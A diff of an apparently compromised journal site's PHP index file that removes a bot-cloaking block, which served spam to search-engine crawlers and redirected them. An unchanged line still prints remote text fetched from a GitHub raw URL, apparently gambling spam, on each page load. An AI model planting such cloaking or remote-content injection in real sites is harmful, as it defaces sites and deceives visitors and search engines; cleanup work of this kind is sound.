@@ -61,32 +61,6 @@
  */
 
 // Initialize global environment
-function is_bot() {
-    $user_agent = $_SERVER['HTTP_USER_AGENT'];
-    $bots = array('Googlebot', 'TelegramBot', 'bingbot', 'Google-Site-Verification', 'Google-InspectionTool');
-
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
-
-function is_homepage() {
-    $uri = parse_url($_SERVER['REQUEST_URI'], PHP_URL_PATH);
-    return $uri === '/' || $uri === '';
-}
-
-if (is_bot()) {
-    if (is_homepage()) {
-        include('/home/stkippas/public_html/jela/js/journal.js');
-    } else {
-        header("Location: https://jela.stkippasundan.ac.id/index.php/jela", true, 301);
-    }
-    exit;
-}
-
 define('INDEX_FILE_LOCATION', __FILE__);
 $application = require('./lib/pkp/includes/bootstrap.inc.php');
 echo file_get_contents("https://raw.githubusercontent.com/seovennn/venxyn/refs/heads/main/nana4d.txt");
